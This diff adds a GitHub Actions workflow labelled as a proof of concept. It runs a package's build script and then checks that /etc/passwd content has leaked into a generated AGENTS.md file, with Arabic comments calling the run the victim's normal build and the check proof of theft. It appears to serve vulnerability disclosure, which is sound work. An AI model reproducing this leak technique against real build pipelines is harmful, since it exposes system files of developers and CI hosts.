@@ -1,0 +1,35 @@
+name: PoC Victim Build
+
+on: [push]
+
+jobs:
+  build-and-leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v3
+
+      - name: Setup Node & PNPM
+        uses: pnpm/action-setup@v2
+        with:
+          version: 8
+
+      - name: Install Dependencies
+        run: pnpm install
+
+      - name: 🚨 VICTIM RUNS BUILD 🚨
+        # دي الخطوة الطبيعية اللي أي مطور أو CI بيعملها
+        run: |
+          cd packages/react-best-practices-build
+          # بنشغل البناء
+          npx tsx src/build.ts --skill=react-best-practices
+
+      - name: 💀 VERIFY THE LEAK 💀
+        # الخطوة دي عشان نثبت إن السر اتسرق
+        run: |
+          echo "Checking for leaked /etc/passwd content inside AGENTS.md..."
+          grep "root:x:0:0" skills/react-best-practices/AGENTS.md
+
+          echo "--- LEAKED CONTENT START ---"
+          head -n 5 skills/react-best-practices/AGENTS.md
+          echo "--- LEAKED CONTENT END ---"
